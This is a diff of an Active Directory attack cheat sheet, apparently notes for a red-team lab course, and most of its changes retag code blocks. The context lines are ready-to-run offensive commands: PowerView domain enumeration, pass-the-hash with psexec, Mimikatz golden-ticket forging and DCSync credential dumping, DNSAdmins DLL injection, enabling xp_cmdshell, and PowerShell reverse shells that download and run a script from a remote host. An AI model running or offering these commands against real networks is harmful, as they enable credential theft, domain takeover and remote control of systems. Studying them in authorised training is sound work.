+%windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
 ```
 
 ## Malleable C2
@@ -5632,23 +5613,23 @@ beacon> PortBender redirect 445 8445
    
 # General
 #### Access C disk of a computer (check local admin)
-```
+```console
 ls \\<computername>\c$
 ```
 
 #### Use this parameter to not print errors powershell
-```
+```console
 -ErrorAction SilentlyContinue
 ```
 
 #### Rename powershell windows
-```
+```console
 $host.ui.RawUI.WindowTitle = "<naam>"
 ```
 
 #### Impacket PSexec impacket
 If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
-```
+```console
 python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
 python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
 ```
@@ -5656,27 +5637,27 @@ python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
 # Domain Enumeration
 ## Powerview Domain
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
-```
+```console
 . ./PowerView.ps1
 ```
 
 #### Get current domain
-```
+```console
 Get-NetDomain
 ```
 
 #### Get object of another domain
-```
+```console
 Get-NetDomain -Domain <domainname>
 ```
 
 #### Get Domain SID for the current domain
-```
+```console
 Get-DomainSID
 ```
 
 #### Get the domain password policy
-```
+```console
 Get-DomainPolicy
 (Get-DomainPolicy)."System Access"
 net accounts
@@ -5684,211 +5665,211 @@ net accounts
 
 ## Powerview users groups and computers
 #### Get Information of domain controller
-```
+```console
 Get-NetDomainController
 Get-NetDomainController | select-object Name
 ```
 
 #### Get information of users in the domain
-```
+```console
 Get-NetUser
 Get-NetUser -Username <username>
 ```
 
 #### Get list of all users
-```
+```console
 Get-NetUser | select samaccountname
 ```
 
 #### Get list of usernames, last logon and password last set
-```
+```console
 Get-NetUser | select samaccountname, lastlogon, pwdlastset
 Get-NetUser | select samaccountname, lastlogon, pwdlastset | Sort-Object -Property lastlogon
 ```
 
 #### Get list of usernames and their groups
-```
+```console
 Get-NetUser | select samaccountname, memberof
 ```
 
 #### Get list of all properties for users in the current domain
-```
+```console
 get-userproperty -Properties pwdlastset
 ```
 
 #### Get descripton field from the user
-```
+```console
 Find-UserField -SearchField Description -SearchTerm "built"
 Get-netuser | Select-Object samaccountname,description
 ```
 
 #### Get computer information
-```
+```console
 Get-NetComputer
 Get-NetComputer -FullData
 Get-NetComputer -Computername <computername> -FullData
 ```
 
 #### Get computers with operating system ""
-```
+```console
 Get-NetComputer -OperatingSystem "*Server 2016*"
 ```
 
 #### Get list of all computer names and operating systems
-```
+```console
 Get-NetComputer -fulldata | select samaccountname, operatingsystem, operatingsystemversion
 ```
 
 #### List all groups of the domain
-```
+```console
 Get-NetGroup
 Get-NetGroup -GroupName *admin*
 Get-NetGroup -Domain <domain>
 ```
 
 #### Get all the members of the group
-```
+```console
 Get-NetGroupMember -Groupname "Domain Admins" -Recurse
 Get-NetGroupMember -Groupname "Domain Admins" -Recurse | select MemberName
 ```
 
 #### Get the group membership of a user
-```
+```console
 Get-NetGroup -Username <username>
 ```
 
 #### List all the local groups on a machine (needs admin privs on non dc machines)
-```
+```console
 Get-NetlocalGroup -Computername <computername> -ListGroups
 ```
 
 #### Get Member of all the local groups on a machine (needs admin privs on non dc machines)
-```
+```console
 Get-NetlocalGroup -Computername <computername> -Recurse
 ```
 
 #### Get actively logged users on a computer (needs local admin privs)
-```
+```console
 Get-NetLoggedon -Computername <computername>
 ```
 
 #### Get locally logged users on a computer (needs remote registry rights on the target)
-```
+```console
 Get-LoggedonLocal -Computername <computername>
 ```
 
 #### Get the last logged users on a computer (needs admin rights and remote registary on the target)
-```
+```console
 Get-LastLoggedOn -ComputerName <computername>
 ```
 
 ## Powerview shares
 #### Find shared on hosts in the current domain
-```
+```console
 Invoke-ShareFinder -Verbose
 Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
 ```
 
 #### Find sensitive files on computers in the domain
-```
+```console
 Invoke-FileFinder -Verbose
 ```
 
 #### Get all fileservers of the domain
-```
+```console
 Get-NetFileServer
 ```
 
 ## Powerview GPO
 #### Get list of GPO's in the current domain
-```
+```console
 Get-NetGPO
 Get-NetGPO -Computername <computername>
 ```
 
 #### Get GPO's which uses restricteds groups or groups.xml for interesting users
-```
+```console
 Get-NetGPOGroup
 ```
 
 #### Get users which are in a local group of a machine using GPO
-```
+```console
 Find-GPOComputerAdmin -Computername <computername>
 ```
 
 #### Get machines where the given user is member of a specific group
-```
+```console
 Find-GPOLocation -Username student244 -Verbose
 ```
 
 #### Get OU's in a domain
-```
+```console
 Get-NetOU -Fulldata
 ```
 
 #### Get machines that are part of an OU
-```
+```console
 Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
 ```
 
 #### Get GPO applied on an OU
 gplink from Get-NetOU -Fulldata
-```
+```console
 Get-NetGPO -GPOname "{<gplink>}"
 ```
 
 ## Powerview ACL
 #### Get the ACL's associated with the specified object
-```
+```console
 Get-ObjectACL -SamAccountName <accountname> -ResolveGUIDS
 ```
 
 #### Get the ACL's associated with the specified prefix to be used for search
-```
+```console
 Get-ObjectACL -ADSprefix ‘CN=Administrator,CN=Users’ -Verbose
 ```
 
 #### Get the ACL's associated with the specified path
-```
+```console
 Get-PathAcl -Path \\<Domain controller>\sysvol
 ```
 
 #### Search for interesting ACL's
-```
+```console
 Invoke-ACLScanner -ResolveGUIDs
 Invoke-ACLScanner -ResolveGUIDs | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
 ```
 
 #### Search of interesting ACL's for the current user
-```
+```console
 Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
 ```
 
 ## Powerview Domain trust
 #### Get a list of all the domain trusts for the current domain
-```
+```console
 Get-NetDomainTrust
 ```
 
 #### Get details about the forest
-```
+```console
 Get-NetForest
 ```
 
 #### Get all domains in the forest
-```
+```console
 Get-NetForestDomain
 Get-NetforestDomain -Forest <domain name>
 ```
 
 #### Get global catalogs for the current forest
-```
+```console
 Get-NetForestCatalog
 Get-NetForestCatalog -Forest <domain name>
 ```
 
 #### Map trusts of a forest
-```
+```console
 Get-NetForestTrust
 Get-NetForestTrust -Forest <domain name>
 Get-NetForestDomain -Verbose | Get-NetDomainTrust
@@ -5896,55 +5877,55 @@ Get-NetForestDomain -Verbose | Get-NetDomainTrust
 
 ## Misc
 ####  Powerview Find all machines on the current domain where the current user has local admin access
-```
+```console
 Find-LocalAdminAccess -Verbose
 ```
 
-```
+```console
 . ./Find-WMILocalAdminAccess.ps1
 Find-WMILocalAdminAccess
 ```
 
-```
+```console
 . ./Find-PSRemotingLocalAdminAccess.ps1
 Find-PSRemotingLocalAdminAccess
 ```
 
 ####  Powerview Find local admins on all machines of the domain (needs admin privs)
-```
+```console
 Invoke-EnumerateLocalAdmin -Verbose
 ```
 
 #### Connect to machine with administrator privs
-```
+```console
 Enter-PSSession -Computername <computername>
 ```
 
 #### Save and use sessions of a machine
-```
+```console
 $sess = New-PSSession -Computername <computername>
 Enter-PSSession $sess
 ```
 
 ####  Find active sessions
-```
+```console
 Invoke-UserHunter
 Invoke-UserHunter -Groupname "RDPUsers"
 ```
 
 ####  Find active sessions of domain admins
-```
+```console
 Invoke-UserHunter -Groupname "Domain Admins"
 ```
 
 ####  check access to machine
-```
+```console
 Invoke-UserHunter -CheckAccess
 ```
 
 ####  BloodHound
 https://github.com/BloodHoundAD/BloodHound
-```
+```console
 cd Ingestors
 . ./sharphound.ps1
 Invoke-Bloodhound -CollectionMethod all -Verbose
@@ -5961,7 +5942,7 @@ Run BloodHound.exe
 ```
 
 ####  Powershell reverse shell
-```
+```powershell
 Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
 ```
 
@@ -5969,20 +5950,20 @@ Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicPar
 Focussing on Service issues
 #### Privesc check all
 https://github.com/enjoiz/Privesc
-```
+```console
 . .\privesc.ps1
 Invoke-PrivEsc
 ```
 
 #### Beroot check all
 https://github.com/AlessandroZ/BeRoot
-```
+```console
 ./beRoot.exe
 ```
 
 ####  Run powerup check all
 https://github.com/HarmJ0y/PowerUp
-```
+```console
 . ./powerup
 Invoke-allchecks
 ```
@@ -6561,25 +6542,25 @@ Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dolla
 ```
 
 #### Use Mimikatz to inject the TGS ticket
-```
+```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```
 
 ### Constrained delegation Computer
 #### Requesting TGT with a PC hash
-```
+```powershell
 ./kekeo.exe
 Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
 ```
 
 #### Requesting TGS
 No validation for the SPN specified
-```
+```powershell
 Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
 ```
 
 #### Using mimikatz to inject TGS ticket and executing DCsync
-```
+```powershell
 Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
 ```
@@ -6587,19 +6568,19 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
 ## DNS Admins
 Indien je over een gebruiker bezit die lid is van de 'DNS admin' is het mogelijk om verschillende aanvallen uit te voeren op de DNS server (Meestal Domain Controller) Het is mogelijk om hier een reverse shell mee te krijgen, maar dit legt heel het DNS verkeer plat binnen het domein aangezien dit de DNS service bezighoudt! Voor meer informatie zie [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise]
 #### Enumerate member of the DNS admin group
-```
+```powershell
 Get-NetGRoupMember “DNSAdmins”
 ```
 
 #### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
 Share the directory the ddl is in for everyone so its accessible.
 logs all DNS queries on C:\Windows\System32\kiwidns.log 
-```
+```powershell
 Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
 ```
 
 #### Restart DNS
-```
+```powershell
 Sc \\<dns server> stop dns
 Sc \\<dns server> start dns
 ```
@@ -6609,50 +6590,50 @@ Sc \\<dns server> start dns
 #### Dump trust keys
 Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(
 Look for NTLM hash (second command)
-```
+```console
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
 ```
 
 #### Create an inter-realm TGT
-```
+```console
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
 ```
 
 #### Create a TGS for a service (kekeo_old)
-```
+```console
 ./asktgs.exe <kirbi file> CIFS/<forest dc name>
 ```
 
 #### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)
-```
+```console
 ./kirbikator.exe lsa .\<kirbi file>
 ```
 
 #### Check access to server
-```
+```console
 ls \\<servername>\c$ 
 ```
 
 ### Child to parent - krbtgt hash
 #### Get krbtgt hash from dc
-```
+```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
 ```
 
 #### Create TGT
 the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
-```
+```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
 ```
 
 #### Inject the ticket
-```
+```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
 ```
 
 #### Get SID of enterprise admin
-```
+```console
 Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
 ```
 
@@ -6661,74 +6642,74 @@ Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select 
 #### Dump trust keys
 Look for in trust key from child to parent (first command)
 Look for NTLM hash (second command)
-```
+```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 ```
 
 #### Create a intern-forest TGT
-```
+```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>"'
 ```
 
 #### Create a TGS for a service (kekeo_old)
-```
+```console
 ./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
 ```
 
 #### Use the TGT
-```
+```console
 ./kirbikator.exe lsa <kirbi file>
 ```
 
 #### Check access to server
-```
+```console
 ls \\<servername>\<share>\
 ```
 
 ### Trust abuse SQL
-```
+```console
 . .\PowerUpSQL.ps1
 ```
 
 #### Discovery SPN scanning
-```
+```console
 Get-SQLInstanceDomain
 ```
 
 #### Check accessibility
-```
+```console
 Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
 ```
 
 #### Gather information
-```
+```console
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
 #### Search for links to remote servers
-```
+```console
 Get-SQLServerLink -Instance <sql instance> -Verbose
 ```
 
 #### Enumerate database links
-```
+```console
 Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
 ```
 
 #### Enable xp_cmdshell
-```
+```console
 Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
 ```
 
 #### Execute commands
-```
+```console
 Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
 ```
 
 #### Execute reverse shell example
-```
+```console
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
 
